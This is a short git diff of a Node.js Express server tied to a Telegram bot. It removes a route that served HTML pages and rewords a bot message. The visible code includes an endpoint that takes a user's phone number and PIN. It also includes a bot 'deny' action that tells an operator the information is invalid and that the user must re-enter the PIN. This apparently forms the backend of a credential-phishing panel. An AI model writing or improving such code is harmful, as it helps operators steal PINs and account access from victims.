@@ -26,24 +26,6 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.get('/:page', (req, res) => {
-    if (req.params.page.startsWith('api')) {
-        return res.status(404).send("Not found");
-    }
-
-    const file = req.params.page.endsWith('.html')
-        ? req.params.page
-        : req.params.page + '.html';
-
-    const filePath = path.join(__dirname, 'public', file);
-
-    res.sendFile(filePath, (err) => {
-        if (err) {
-            res.status(404).send("Page not found");
-        }
-    });
-});
-
 // -------------------- LOGIN API --------------------
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
@@ -151,7 +133,7 @@ bot.action(/deny_(.+)/, async (ctx) => {
 
     try {
         await ctx.replyWithHTML(
-            `❌ <b>INVALID INFORMATION</b>\n\n📱 <b>User:</b> ${phone}\n\n⚠️ <b>User must re-enter PIN.</b>`
+            `❌ <b>INVALID INFORMATION</b>\n\n📱 <b>User:</b> ${phone}\n⚠️ <b>Please re-enter PIN</b>`
         );
         await ctx.answerCbQuery("Invalid information");
     } catch (e) {
